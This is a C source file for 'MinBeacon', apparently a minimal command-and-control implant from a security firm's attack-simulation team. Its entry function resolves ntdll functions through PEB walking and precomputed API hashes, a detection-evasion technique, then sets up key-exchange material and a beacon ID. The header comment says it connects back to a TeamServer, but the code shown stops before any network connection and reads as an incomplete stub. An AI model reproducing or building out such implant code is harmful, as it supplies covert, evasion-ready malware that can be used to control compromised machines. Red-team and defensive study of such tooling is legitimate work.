/*!
 *
 * MINBEACON
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( RtlAllocateHeap );
	D_API( RtlFreeHeap );
} API ;

/* API Hashes */
#define H_API_RTLALLOCATEHEAP	0x3be94c5a /* RtlAllocateHeap */
#define H_API_RTLFREEHEAP	0x73a9e4d7 /* RtlFreeHeap */

/* LIB Hashes */
#define H_LIB_NTDLL		0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Initializes the MinBeacon context, and starts
 * a connection back to the TeamServer. Supports
 * a minimal amount of commands.
 *
!*/
D_SEC( B ) VOID WINAPI Entry( VOID )
{
	API		Api;
	PMINBEACON_CTX	Ctx = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	/* Build Stack API Table */
	Api.RtlAllocateHeap = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.RtlFreeHeap     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );

	/* Allocate the context structure to hold information about the Beacon */
	if ( ( Ctx = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( MINBEACON_CTX ) ) ) ) {

		/* Initializes the AES / HMAC keys for the key exchange */
		RandomString( Ctx->Key, sizeof( Ctx->Key ) );

		/* Generate the BID: Must be an divisible by 2 for TS */
		Ctx->Bid = ( ( RandomInt32( ) + 2 - 1 ) &~ ( 2 - 1 ) );

		/* Free context structure */
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Ctx );
		Ctx = NULL;
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
};
